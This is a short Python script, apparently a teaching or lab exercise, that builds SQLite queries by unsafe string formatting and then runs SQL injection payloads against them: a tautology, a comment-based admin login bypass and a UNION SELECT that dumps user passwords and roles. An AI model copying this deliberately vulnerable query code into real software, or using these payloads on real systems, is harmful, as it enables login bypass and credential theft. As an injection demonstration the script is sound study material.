import sqlite3
from unicodedata import name
conn = sqlite3.connect('nyondo_stock.db')

def search_product(name):
    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
    print(f'Query: {query}')
    rows = conn.execute(query).fetchall()
    print(f'Result: {rows}\n')
    return rows

def login(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f'Query: {query}')
    row = conn.execute(query).fetchone()
    print(f"Result: {row}\n")
    return row

search_product("' OR 1=1--")

login("admin'--", "anything")

login("' OR '1'='1", "' OR '1'='1")

search_product("' UNION SELECT id, username, password, role FROM users--")